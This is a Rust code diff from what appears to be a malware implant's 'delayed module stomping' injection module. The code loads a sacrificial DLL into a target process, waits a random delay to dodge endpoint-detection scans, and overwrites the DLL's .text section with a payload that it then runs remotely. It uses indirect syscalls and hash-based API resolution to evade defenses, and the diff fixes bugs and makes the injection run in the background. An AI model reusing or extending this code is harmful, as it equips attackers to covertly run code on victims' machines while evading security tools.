@@ -194,13 +194,46 @@ impl Drop for PendingStomp {
 
         // Close the process handle (opened via NtOpenProcess in phase1_load).
         // If ownership was transferred to InjectionHandle via phase2_stomp_and_execute,
-        // the handle may already be closed — NtClose will return an error we ignore.
+        // process_handle is zeroed and we skip the close — avoiding a double-close
+        // that could close an unrelated kernel handle.
         if self.process_handle != 0 {
-            if let Ok(t) = crate::syscalls::get_syscall_id("NtClose") {
-                let _ = unsafe {
+            let handle_closed = if let Ok(t) = crate::syscalls::get_syscall_id("NtClose") {
+                let status = unsafe {
                     crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[self.process_handle as u64])
                 };
-                log::debug!(
+                status >= 0
+            } else {
+                // Fallback: resolve kernel32!CloseHandle via PE walking and
+                // call it directly when the NtClose SSN is unavailable.
+                // This prevents silent handle leaks during Drop.
+                let closed = unsafe {
+                    pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
+                        .and_then(|k32| {
+                            pe_resolve::get_proc_address_by_hash(
+                                k32,
+                                pe_resolve::hash_str(b"CloseHandle\0"),
+                            )
+                        })
+                        .map(|addr| {
+                            let close_fn: extern "system" fn(usize) -> i32 =
+                                std::mem::transmute(addr);
+                            close_fn(self.process_handle) != 0
+                        })
+                        .unwrap_or(false)
+                };
+                if !closed {
+                    tracing::warn!(
+                        "[delayed-stomp] PendingStomp drop: failed to close process handle {:#x} \
+                         for PID {} — both NtClose SSN and kernel32!CloseHandle fallback failed",
+                        self.process_handle,
+                        self.target_pid
+                    );
+                }
+                closed
+            };
+
+            if handle_closed {
+                tracing::debug!(
                     "[delayed-stomp] PendingStomp drop: closed process handle {:#x} for PID {}",
                     self.process_handle,
                     self.target_pid
@@ -379,6 +412,8 @@ unsafe fn enumerate_remote_modules(process_handle: *mut c_void) -> Result<Vec<Mo
             if status < 0 {
                 return Err(anyhow!("NtReadVirtualMemory failed: {status:#x}"));
             }
+        } else {
+            return Err(anyhow!("NtReadVirtualMemory SSN not available"));
         }
         Ok(())
     };
@@ -409,19 +444,21 @@ unsafe fn enumerate_remote_modules(process_handle: *mut c_void) -> Result<Vec<Mo
         let size_of_image = read_usize(entry_addr + 0x40)?;
 
         // BaseDllName (UNICODE_STRING) is at offset 0x58
-        // UNICODE_STRING: Length (u16), MaxLength (u16), Buffer (ptr)
+        // UNICODE_STRING on 64-bit: Length (u16), MaximumLength (u16),
+        //   4 bytes padding, Buffer (usize) — total 16 bytes.
+        // Layout: [0..2]=Length, [2..4]=MaxLength, [4..8]=padding, [8..16]=Buffer
         let mut name_buf = [0u8; 16];
         read_buf(entry_addr + 0x58, &mut name_buf)?;
         let name_len = u16::from_le_bytes([name_buf[0], name_buf[1]]) as usize;
         let name_buffer_ptr = usize::from_le_bytes([
-            name_buf[4],
-            name_buf[5],
-            name_buf[6],
-            name_buf[7],
             name_buf[8],
             name_buf[9],
             name_buf[10],
             name_buf[11],
+            name_buf[12],
+            name_buf[13],
+            name_buf[14],
+            name_buf[15],
         ]);
 
         let mut name_utf16 = vec![0u16; name_len / 2];
@@ -612,7 +649,7 @@ unsafe fn load_dll_remote(process_handle: *mut c_void, dll_path: &str) -> Result
             ],
         );
     } else {
-        log::warn!("[delayed-stomp] NtWaitForSingleObject SSN unavailable, closing thread handle without waiting");
+        tracing::warn!("[delayed-stomp] NtWaitForSingleObject SSN unavailable, closing thread handle without waiting");
     }
 
     // Always close the thread handle — use syscall_NtClose as guaranteed fallback.
@@ -812,13 +849,13 @@ unsafe fn stomp_text_section(
             &[process_handle as u64, text_va as u64, payload.len() as u64],
         );
         if flush_status < 0 {
-            log::warn!(
+            tracing::warn!(
                 "injection_delayed_stomp: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
                 flush_status as u32
             );
         }
     } else {
-        log::debug!("injection_delayed_stomp: NtFlushInstructionCache syscall not available");
+        tracing::debug!("injection_delayed_stomp: NtFlushInstructionCache syscall not available");
     }
 
     // Restore protection to RX
@@ -1076,7 +1113,7 @@ pub unsafe fn phase1_load(
     let dll_name = select_sacrificial_dll(&modules, candidates)
         .ok_or_else(|| anyhow!("no suitable sacrificial DLL found"))?;
 
-    log::info!(
+    tracing::info!(
         "[delayed-stomp] Selected sacrificial DLL: {} (target PID {})",
         dll_name,
         target_pid
@@ -1112,7 +1149,7 @@ pub unsafe fn phase1_load(
     load_dll_remote(process_handle as *mut c_void, &dll_path)
         .with_context(|| format!("failed to load {} into target", dll_name))?;
 
-    log::info!(
+    tracing::info!(
         "[delayed-stomp] DLL {} loaded into PID {}",
         dll_name,
         target_pid
@@ -1130,7 +1167,7 @@ pub unsafe fn phase1_load(
         .ok_or_else(|| anyhow!("DLL {} not found after loading", dll_name))?;
 
     let dll_base = dll_module.base;
-    log::info!("[delayed-stomp] DLL {} base: {:#x}", dll_name, dll_base);
+    tracing::info!("[delayed-stomp] DLL {} base: {:#x}", dll_name, dll_base);
 
     // Find .text section
     let (text_va, text_size) = find_text_section(process_handle as *mut c_void, dll_base)
@@ -1149,7 +1186,7 @@ pub unsafe fn phase1_load(
         min_delay_secs + rand::thread_rng().gen_range(0..(max_delay_secs - min_delay_secs))
     };
 
-    log::info!(
+    tracing::info!(
         "[delayed-stomp] Phase 1 complete. Delay: {}s before stomp",
         delay_secs
     );
@@ -1173,10 +1210,13 @@ pub unsafe fn phase1_load(
 /// Phase 2 of delayed stomp: overwrite .text section and execute payload.
 ///
 /// This is called after the delay has elapsed.
-pub unsafe fn phase2_stomp_and_execute(pending: &PendingStomp) -> Result<InjectionHandle> {
+pub unsafe fn phase2_stomp_and_execute(mut pending: PendingStomp) -> Result<InjectionHandle> {
     let process_handle = pending.process_handle as *mut c_void;
+    // Transfer ownership of the process handle to InjectionHandle.
+    // Zero it here so PendingStomp::drop does not double-close.
+    pending.process_handle = 0;
 
-    log::info!(
+    tracing::info!(
         "[delayed-stomp] Phase 2: stomping {} at {:#x} ({} byte payload)",
         pending.dll_name,
         pending.text_section_va,
@@ -1203,13 +1243,13 @@ pub unsafe fn phase2_stomp_and_execute(pending: &PendingStomp) -> Result<Injecti
         pending.text_section_va
     };
 
-    log::info!("[delayed-stomp] Entry point: {:#x}", entry_address);
+    tracing::info!("[delayed-stomp] Entry point: {:#x}", entry_address);
 
     // Execute
     let thread_handle = execute_payload(process_handle, entry_address)
         .with_context(|| "failed to execute payload")?;
 
-    log::info!(
+    tracing::info!(
         "[delayed-stomp] Payload executing in PID {} via thread {:#x}",
         pending.target_pid,
         thread_handle
@@ -1229,11 +1269,17 @@ pub unsafe fn phase2_stomp_and_execute(pending: &PendingStomp) -> Result<Injecti
 
 // ── Full injection pipeline ──────────────────────────────────────────────────
 
-/// Convenience function: perform the full delayed stomp injection
-/// (Phase 1 + wait + Phase 2) in a blocking fashion.
+/// Perform the full delayed stomp injection (Phase 1 + spawn background
+/// thread for the delay + Phase 2).
 ///
-/// For non-blocking usage, use `phase1_load()` and schedule `phase2_stomp_and_execute()`
-/// via the agent's timer infrastructure.
+/// This function is **non-blocking**: after completing Phase 1 (loading the
+/// sacrificial DLL), it spawns a background thread that waits for the
+/// configured delay and then performs Phase 2 (stomping `.text` and
+/// executing the payload).  The agent's main task loop continues
+/// uninterrupted.
+///
+/// Returns an `InjectionHandle` reflecting the Phase 1 state (DLL loaded,
+/// stomp pending).  Phase 2 results are logged.
 pub unsafe fn inject_delayed_stomp(
     target_pid: u32,
     payload: &[u8],
@@ -1243,15 +1289,55 @@ pub unsafe fn inject_delayed_stomp(
     // Phase 1: Load DLL
     let pending = phase1_load(target_pid, payload, min_delay_secs, max_delay_secs)?;
 
-    // Wait for the delay
-    log::info!(
-        "[delayed-stomp] Waiting {} seconds for EDR scan window to pass...",
-        pending.delay_secs
-    );
-    std::thread::sleep(std::time::Duration::from_secs(pending.delay_secs as u64));
+    let delay_secs = pending.delay_secs;
+    let process_handle = pending.process_handle;
+    let dll_base = pending.dll_base;
+    let payload_size = pending.payload.len();
 
-    // Phase 2: Stomp and execute
-    phase2_stomp_and_execute(&pending)
+    tracing::info!(
+        "[delayed-stomp] Phase 1 complete: DLL loaded at {:#x}, spawning background thread for {}s delay + Phase 2",
+        dll_base,
+        delay_secs,
+    );
+
+    // Spawn background thread for the delay + Phase 2
+    std::thread::Builder::new()
+        .name("delayed-stomp-phase2".into())
+        .spawn(move || {
+            tracing::info!("[delayed-stomp] Phase 2 thread: waiting {}s for EDR scan window...", delay_secs);
+            std::thread::sleep(std::time::Duration::from_secs(delay_secs as u64));
+
+            match phase2_stomp_and_execute(pending) {
+                Ok(handle) => {
+                    tracing::info!(
+                        "[delayed-stomp] Phase 2 complete: PID={}, base={:#x}, size={}",
+                        handle.target_pid,
+                        handle.injected_base_addr,
+                        handle.payload_size
+                    );
+                    // Clean up handles — fire-and-forget path.
+                    if let Err(e) = handle.eject() {
+                        tracing::warn!("[delayed-stomp] handle eject failed: {e:?}");
+                    }
+                }
+                Err(e) => {
+                    tracing::error!("[delayed-stomp] Phase 2 failed: {e:#}");
+                }
+            }
+        })
+        .map_err(|e| anyhow!("failed to spawn phase 2 thread: {e}"))?;
+
+    // Return an InjectionHandle reflecting Phase 1 state.
+    Ok(InjectionHandle {
+        target_pid,
+        technique_used: InjectionTechnique::DelayedModuleStomp,
+        injected_base_addr: dll_base,
+        payload_size,
+        thread_handle: None, // Phase 2 thread runs independently
+        process_handle: process_handle as *mut c_void,
+        sleep_enrolled: false,
+        sleep_stub_addr: 0,
+    })
 }
 
 // ── Background thread version (non-blocking) ─────────────────────────────────
@@ -1279,12 +1365,12 @@ pub fn inject_delayed_stomp_async(
     std::thread::Builder::new()
         .name("delayed-stomp-phase2".into())
         .spawn(move || {
-            log::info!("[delayed-stomp] Phase 2 thread: waiting {}s...", delay_secs);
+            tracing::info!("[delayed-stomp] Phase 2 thread: waiting {}s...", delay_secs);
             std::thread::sleep(std::time::Duration::from_secs(delay_secs as u64));
 
-            match unsafe { phase2_stomp_and_execute(&pending) } {
+            match unsafe { phase2_stomp_and_execute(pending) } {
                 Ok(handle) => {
-                    log::info!(
+                    tracing::info!(
                         "[delayed-stomp] Phase 2 complete: PID={}, base={:#x}, size={}",
                         handle.target_pid,
                         handle.injected_base_addr,
@@ -1293,11 +1379,11 @@ pub fn inject_delayed_stomp_async(
                     // Clean up handles — async path is fire-and-forget,
                     // so we eject the injection to close thread/process handles.
                     if let Err(e) = handle.eject() {
-                        log::warn!("[delayed-stomp] handle eject failed: {e:?}");
+                        tracing::warn!("[delayed-stomp] handle eject failed: {e:?}");
                     }
                 }
                 Err(e) => {
-                    log::error!("[delayed-stomp] Phase 2 failed: {e:#}");
+                    tracing::error!("[delayed-stomp] Phase 2 failed: {e:#}");
                 }
             }
         })
